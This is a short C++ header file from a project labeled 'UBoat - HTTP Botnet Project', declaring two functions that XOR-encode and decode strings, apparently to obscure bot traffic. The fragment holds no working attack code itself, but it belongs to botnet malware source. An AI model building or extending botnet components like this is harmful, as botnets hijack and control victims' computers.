/**
 * This file is part of UBoat - HTTP Botnet Project
 */

#ifndef __UBOAT_WEBSAFEENCRYPTION_H
#define __UBOAT_WEBSAFEENCRYPTION_H

#include <string>

#include "xor.h"

XorResult GetEncodedXorResult(const std::string& input, const std::string& key);
std::string GetDecodedXorResult(const std::string& input, const std::string& key);

#endif // __UBOAT_WEBSAFEENCRYPTION_H
